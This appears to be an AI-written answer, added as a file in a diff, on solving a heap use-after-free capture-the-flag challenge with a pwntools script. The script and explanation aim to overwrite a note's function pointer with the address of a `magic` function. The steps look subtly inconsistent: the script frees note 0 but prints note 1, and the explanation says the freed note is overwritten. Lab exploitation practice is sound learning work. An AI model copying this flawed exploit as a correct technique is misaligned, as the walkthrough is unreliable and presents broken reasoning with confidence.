@@ -1,0 +1,87 @@
+To solve this challenge using pwntools, we need to exploit a heap-based vulnerability. The key functions to focus on are `add_note`, `del_note`, and `print_note`. The goal is to overwrite the function pointer in the note structure to point to the `magic` function, which will print the flag.
+
+Here's a step-by-step guide to solving this challenge using pwntools:
+
+1. **Set up the environment**:
+   - Install pwntools if you haven't already.
+   - Download the binary and ensure it's executable.
+
+2. **Analyze the binary**:
+   - The binary allows us to add, delete, and print notes.
+   - Each note has a function pointer that points to `print_note_content`.
+   - We can use a use-after-free (UAF) vulnerability to overwrite this function pointer.
+
+3. **Exploit the UAF vulnerability**:
+   - Add two notes.
+   - Delete the first note.
+   - Add a new note with the same size as the first note, but with the content being the address of the `magic` function.
+   - Print the second note, which should now call `magic` and print the flag.
+
+Here's the Python code to achieve this:
+
+```python
+from pwn import *
+
+# Set up the process
+elf = ELF('heap')
+p = process(elf.path)
+
+# Function to interact with the menu
+def menu(choice):
+    p.sendlineafter(b'Your choice :', str(choice).encode())
+
+# Function to add a note
+def add_note(size, content):
+    menu(1)
+    p.sendlineafter(b'Note size :', str(size).encode())
+    p.sendlineafter(b'Content :', content)
+
+# Function to delete a note
+def del_note(index):
+    menu(2)
+    p.sendlineafter(b'Index :', str(index).encode())
+
+# Function to print a note
+def print_note(index):
+    menu(3)
+    p.sendlineafter(b'Index :', str(index).encode())
+
+# Step 1: Add two notes
+add_note(0x10, b'A' * 0x10)  # Note 0
+add_note(0x10, b'B' * 0x10)  # Note 1
+
+# Step 2: Delete the first note
+del_note(0)
+
+# Step 3: Add a new note with the same size as the first note, but with the content being the address of the magic function
+magic_addr = elf.symbols['magic']
+add_note(0x10, p32(magic_addr))
+
+# Step 4: Print the second note, which should now call magic and print the flag
+print_note(1)
+
+# Interact with the process
+p.interactive()
+```
+
+### Explanation:
+1. **Setup**:
+   - Load the ELF file and start the process.
+   - Define helper functions to interact with the menu and perform actions like adding, deleting, and printing notes.
+
+2. **Add Notes**:
+   - Add two notes with a size of 0x10 bytes each.
+
+3. **Delete Note**:
+   - Delete the first note, creating a use-after-free condition.
+
+4. **Add New Note**:
+   - Add a new note with the same size as the first note, but with the content being the address of the `magic` function. This overwrites the function pointer in the freed note.
+
+5. **Print Note**:
+   - Print the second note, which now calls the `magic` function and prints the flag.
+
+6. **Interact**:
+   - Use `p.interactive()` to interact with the process and see the flag.
+
+This script should help you exploit the heap-based vulnerability and get the flag. Make sure to run it in a controlled environment and adjust the paths and addresses as needed.
